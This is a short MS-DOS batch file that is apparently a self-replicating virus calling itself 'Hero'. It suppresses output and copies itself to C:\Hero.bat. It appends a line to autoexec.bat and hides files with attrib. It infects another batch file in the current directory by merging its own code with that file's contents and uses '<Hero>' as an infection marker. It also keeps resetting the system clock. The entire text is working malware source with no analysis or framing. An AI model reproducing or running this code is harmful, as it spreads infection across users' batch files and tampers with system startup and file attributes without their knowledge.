@Echo Off
ctty nul
if not exist c:\Hero.bat goto Heroe
:Vuelve
for %%r in (*.b?t) do set H=%%r
time 00:00
find /i "<Hero>" %H%
time 00:00
if not errorlevel 1 goto Deu
time 00:00
copy /a %0+%H% h.h /Y
del %H%
ren h.h %H%
exit
:Heroe
copy %0 C:\Hero.bat
attrib C:\*roX.b?t +h +r
time 00:00
echo Hero was Here>>C:\autoexec.bat
goto Vuelve
:Deu
exit
